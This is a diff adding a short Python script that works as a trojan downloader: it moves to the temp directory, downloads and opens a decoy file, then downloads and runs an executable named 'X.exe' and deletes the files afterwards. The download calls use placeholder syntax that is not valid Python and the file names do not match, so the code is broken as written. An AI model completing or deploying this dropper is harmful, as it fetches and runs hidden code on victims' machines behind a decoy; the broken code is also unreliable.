@@ -1,0 +1,24 @@
+#!/usr/bin/env python
+import requests
+import subprocess
+import smtplib
+import os
+import tempfile
+
+
+def download(url):
+    get_response = requests.get(url)
+    file_name = url.split("/")[-1]
+    with open(file_name, "wb") as out_file:
+        out_file.write(get_response.content)
+
+
+temp_dir = tempfile.gettempdir()
+os.chdir(temp_dir)
+download(*.exe_direct_download_link)
+subprocess.Popen("dummy_file", shell=True)
+# subprocess.Popen("open dummy_file", shell=True) [For OS-X]
+download(*.exe_direct_download_link)
+subprocess.call("X.exe", shell=True)
+os.remove("dummy file")
+os.remove(".exe")
